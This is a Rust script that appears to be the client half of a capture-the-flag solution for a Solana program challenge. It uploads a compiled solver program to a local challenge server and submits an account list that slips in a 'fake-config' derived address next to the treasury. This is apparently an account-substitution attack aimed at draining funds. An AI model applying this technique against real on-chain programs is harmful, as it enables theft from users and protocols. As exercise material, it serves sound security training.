use solana_sdk::pubkey::Pubkey;
use std::{
    collections::HashMap,
    env,
    error::Error,
    fs,
    io::{BufRead, BufReader, Read, Write},
    net::TcpStream,
};

const SOLVE_PROGRAM: [u8; 32] = [103; 32];

fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = env::args().collect();
    let host = args.get(1).map(String::as_str).unwrap_or("127.0.0.1");
    let port = args.get(2).map(String::as_str).unwrap_or("5003");
    let so_path = args.get(3).map(String::as_str).unwrap_or("/opt/solve.so");
    let solve_so = fs::read(so_path)?;
    let solve_id = Pubkey::new_from_array(SOLVE_PROGRAM);
    let fake_config = Pubkey::find_program_address(&[b"fake-config"], &solve_id).0;

    let mut stream = TcpStream::connect(format!("{host}:{port}"))?;
    stream.set_nodelay(true)?;
    let mut reader = BufReader::new(stream.try_clone()?);
    wait_for(&mut reader, "program pubkey:")?;
    writeln!(stream, "{solve_id}")?;
    wait_for(&mut reader, "program len:")?;
    writeln!(stream, "{}", solve_so.len())?;
    stream.write_all(&solve_so)?;
    stream.flush()?;

    let values = read_values_until(&mut reader, "num accounts:")?;
    let accounts = [
        format!("sw {}", values["player"]),
        format!("w {fake_config}"),
        format!("w {}", values["treasury"]),
        format!("- {}", values["program"]),
        format!("- {}", solana_system_interface::program::ID),
    ];
    writeln!(stream, "{}", accounts.len())?;
    for account in accounts {
        writeln!(stream, "{account}")?;
    }
    wait_for(&mut reader, "ix len:")?;
    writeln!(stream, "0")?;
    stream.flush()?;

    let mut result = String::new();
    reader.read_to_string(&mut result)?;
    print!("{result}");
    Ok(())
}

fn wait_for(reader: &mut BufReader<TcpStream>, needle: &str) -> Result<(), Box<dyn Error>> {
    loop {
        let mut line = String::new();
        if reader.read_line(&mut line)? == 0 {
            return Err(format!("server closed before {needle}").into());
        }
        print!("{line}");
        if line.contains(needle) {
            return Ok(());
        }
    }
}

fn read_values_until(
    reader: &mut BufReader<TcpStream>,
    needle: &str,
) -> Result<HashMap<String, String>, Box<dyn Error>> {
    let mut values = HashMap::new();
    loop {
        let mut line = String::new();
        if reader.read_line(&mut line)? == 0 {
            return Err(format!("server closed before {needle}").into());
        }
        print!("{line}");
        if line.contains(needle) {
            return Ok(values);
        }
        if let Some((key, value)) = line.trim().split_once(": ") {
            values.insert(key.to_string(), value.to_string());
        }
    }
}
